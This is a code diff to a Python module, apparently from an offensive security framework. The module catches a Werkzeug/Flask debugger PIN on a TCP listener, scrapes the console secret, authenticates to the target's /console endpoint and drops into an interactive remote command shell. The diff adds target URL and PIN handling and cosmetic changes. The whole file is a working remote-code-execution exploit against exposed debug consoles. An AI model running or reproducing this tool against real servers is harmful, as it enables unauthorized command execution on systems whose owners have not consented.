@@ -2,6 +2,7 @@ from core.vmnf_payloads import VMNFPayloads
 from random import randint,random,choice
 from requests.utils import requote_uri
 from neotermcolor import colored,cprint
+from urllib.parse import urlparse
 from res.stage import stager
 from urllib.parse import quote
 from datetime import datetime
@@ -45,18 +46,28 @@ class siddhi:
     class TCPHandler(socketserver.BaseRequestHandler):
         def handle(self):
             self.siddhi_name = colored('4tl4tl','blue')
-            target = 'http://127.0.0.1:2222'
+            _set_ = stager(**{'session': False}).check_forward()
+            
+            if _set_ is None:
+                print('[{}]➳ Failure!\n'.format(self.siddhi_name))
+                sys.exit()
+
+            if _set_.get('forward_session').strip() == 'atlatl':
+                _set_ = urlparse(_set_.get('target_url'))
+                target_url = (_set_.scheme + '://' + _set_.netloc)
+
             self.data = self.request.recv(1024).strip()
             if 'PIN' in self.data.decode():
                 pin = self.data.decode().split(':')[1].replace("']",'').replace("\\n",'').strip()
-                print('[{}]→ PIN caught: {}'.format(
+                print('[{}]➳ PIN caught: {}'.format(
                     self.siddhi_name,colored(pin,'white',attrs=['bold'])
                     )
                 )
                 sleep(1)
                 
-                #self.request.sendall('blas1'.encode())
-                siddhi().console_hook(target,pin)
+                # this will be used in future versions
+                #self.request.sendall('blas1'.encode()) 
+                siddhi().console_hook(target_url,pin)
                 setattr(self.server, '_BaseServer__shutdown_request', True)
 
     def get_secret(self,response):
@@ -85,7 +96,7 @@ class siddhi:
     
     def show_cmd_output(self,response):
         if not response:
-            print('[{}]→ Something went wrong. maybe you ran a weirdo cmd that confused the parser'.format(self.siddhi_name))
+            print('[{}]➳ Something went wrong. maybe you ran a weirdo cmd that confused the parser'.format(self.siddhi_name))
             return False
 
         if response.status_code == 200:
@@ -96,7 +107,7 @@ class siddhi:
             resp_l = len(cmd_response)
             
             if cmd_response is None:
-                print('[{}]→ Server response doesnt match with a expected one.'.format(
+                print('[{}]➳ Server response doesnt match with a expected one.'.format(
                     self.siddhi_name
                     )
                 )
@@ -125,6 +136,7 @@ class siddhi:
             return out_text
 
     def console_hook(self,target,pin):
+        
         target_url= "{}/console".format(target)
         auth_part= "?__debugger__=yes&cmd=pinauth&pin={}&s={}"
         cmd_part="?__debugger__=yes&cmd={}&frm=0&s={}"
@@ -142,7 +154,7 @@ class siddhi:
         response = self.request_url(target_url,**headers)
         
         if not response:
-            print('[{}] →  Connection failure. Please, check target url and try again'.format(
+            print('[{}]➳ Connection failure. Please, check target url and try again'.format(
                 self.siddhi_name
                 )
             )
@@ -151,34 +163,34 @@ class siddhi:
         secret = self.get_secret(response).strip()
     
         if not secret:
-            print('[{}] → Console secret was not found, check target URL'.format(self.siddhi_name))
+            print('[{}]➳ Console secret was not found, check target URL'.format(self.siddhi_name))
             return False
 
         if not pin:
-            print('[{}] → Missing console PIN'.format(self.siddhi_name))
+            print('[{}]➳ Missing console PIN'.format(self.siddhi_name))
             return False
 
         auth_url = target_url + auth_part.format(pin,secret)
         response = self.request_url(auth_url,**headers)
     
         if not response:
-            print('[{}] → We got some problems during initial steps. Make sure the target and port are correct.'.format(self.siddhi_name))
+            print('[{}]➳ We got some problems during initial steps. Make sure the target and port are correct.'.format(self.siddhi_name))
             sys.exit(1)
 
         if response.status_code == 200:
             try:
                 auth_status = (response.json())
             except json.decoder.JSONDecodeError:
-                print('[{}] → An error ocurred during parsing response'.format(self.siddhi_name))
+                print('[{}]➳ An error ocurred during parsing response'.format(self.siddhi_name))
                 return False
 
             if auth_status.get('auth'):
-                print('[{}]→ Successfuly authenticated at {}'.format(self.siddhi_name,datetime.now()))
+                print('[{}]➳ Successfuly authenticated at {}'.format(self.siddhi_name,datetime.now()))
                 sleep(1)
                 for k,v in (response.headers.items()):
                     print('     + {}: {}'.format(k,v))
         else:
-            print('[{}] → Not authenticated'.format(self.siddhi_name))
+            print('[{}]➳ Not authenticated'.format(self.siddhi_name))
             return False
     
         session_cookie = response.headers.get('Set-Cookie') 
@@ -188,13 +200,13 @@ class siddhi:
             return False
 
         hl_cookie = colored(session_cookie,'white', attrs=['bold'])
-        print('\n[{}]→ Using cookie {}'.format(self.siddhi_name,hl_cookie))
+        print('\n[{}]➳ Using cookie {}'.format(self.siddhi_name,hl_cookie))
         sleep(1)
     
         # update headers with set-cookie session
         headers.update({'Cookie':session_cookie})
         hl_sec = colored(secret,'white', attrs=['bold'])
-        print('[{}]→ Using secret {}'.format(self.siddhi_name,hl_sec))
+        print('[{}]➳ Using secret {}'.format(self.siddhi_name,hl_sec))
         sleep(1)
         
         id_url = target_url + cmd_part.format(self.get_payload('hostname'),secret)
@@ -212,7 +224,7 @@ class siddhi:
 
             while True:
                 try:
-                    cmd = input(colored('\n{}@{} → '.format(
+                    cmd = input(colored('\n{}@{} ➳ '.format(
                         atlatl_flag,hostname), 'blue', attrs=[])
                     )
 
@@ -263,10 +275,9 @@ class siddhi:
         )
 
     def load(self):
-        #➳ ➵ ➴ ➶ ➸ ➷ ➹
         s='➳ ➵'
         print('\n\n')
-        for c in range(30):
+        for c in range(15):
             shot = '''\t   ➴  ➶ ➷➹'''*c + s * c 
             os.system('clear')
             cprint(shot,choice(
@@ -277,34 +288,73 @@ class siddhi:
             sleep(0.07)
 
     def start(self,port=False):
+        mis_reqs = False
+        hlt = colored('--target-url', 'white')
+        hlp = colored('--console-pin', 'white')
+
+        if not self.vmnf_handler.get("session_mode"):
+            if self.vmnf_handler['local_port']\
+                or self.vmnf_handler['local_port']:
+                
+                cprint("""\n[{}]➳ Parameters such as --local-host or local-port are not necessary in this mode""".format(
+                    self.siddhi_name,
+                    ), 'cyan'
+                ) 
+
+            if not self.vmnf_handler.get('console_pin'):
+                mis_reqs = True
+                hlp = colored('--console-pin', 'red', attrs=['bold'])
+
+            if not self.vmnf_handler.get('target_url'):
+                mis_reqs = True
+                hlt = colored('--target-url', 'red', attrs=['bold'])
+            
+            if mis_reqs:
+                cprint("""[{}]➳ In this mode you need to specify {} and {}\n\n""".format(
+                    self.siddhi_name,
+                    hlt, hlp
+                    ), 'cyan'
+                ) 
+
+                sys.exit()
+            
+            self.console_hook(
+                self.vmnf_handler.get("target_url"),
+                self.vmnf_handler.get("console_pin")
+            )
+            
+
+        #self.start_catcher()
+
         self.load()
         os.system('clear')
-        
+
         cprint("""
              _|      _|              _|      _|
    _|_|_|  _|_|_|_|  ➵|    _|_|➵|  _|_|_|_|  _| ➵
  ➵|    _|    _|      _|  _|    ➵|    _|      ➵|  ➵
  _|    _|    _|      _|  _|    ➵|    ➵|      _|     ➵ ➵
    _|_|➵|      _|➵|  _|    _|_|➵|      _|_|  _|
+
         """,'blue',attrs=['bold'])
 
-
-        print()
-        if self.vmnf_handler.get("session_mode"):
-            self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
-            if not self.vmnf_handler:
-                print('[{}] An error occurred while loading session.'.format(
-                    self.siddhi_name,call_siddhi
-                    )
-                )
-                return False
-
-            call_siddhi = colored(self.vmnf_handler.get('module_run'), 'blue')
-            print('[{}] Loading settings from {} session...'.format(
+        
+        self.vmnf_handler = stager(**self.vmnf_handler).check_forward()
+        
+        if not self.vmnf_handler:
+            print('[{}] An error occurred while loading session.'.format(
                 self.siddhi_name,call_siddhi
                 )
             )
-            sleep(1)
+            return False
+
+        call_siddhi = colored(self.vmnf_handler.get('module_run'), 'blue')
+        
+        print('[{}]➳ Loading settings from {} session...'.format(
+            self.siddhi_name,call_siddhi
+            )
+        )
+        sleep(1)
 
         target = self.vmnf_handler.get('local_host','127.0.0.1')
         try:
@@ -316,7 +366,7 @@ class siddhi:
             )
             return False
 
-        print('[{}]→ Listening at {} {}...'.format(
+        print('[{}]➳ Listening at {} {}...'.format(
             self.siddhi_name,
             colored(target,'white', attrs=['bold']),
             colored(port, 'white', attrs=['bold'])
@@ -326,6 +376,6 @@ class siddhi:
             with socketserver.TCPServer((target, port), self.TCPHandler) as server:
                 server.serve_forever()
         except OSError:
-            port = int(input('[{}]→ Choose another port to start listener: '.format(self.siddhi_name)))
+            port = int(input('[{}]➳ Choose another port to start listener: '.format(self.siddhi_name)))
             self.start(port)
 
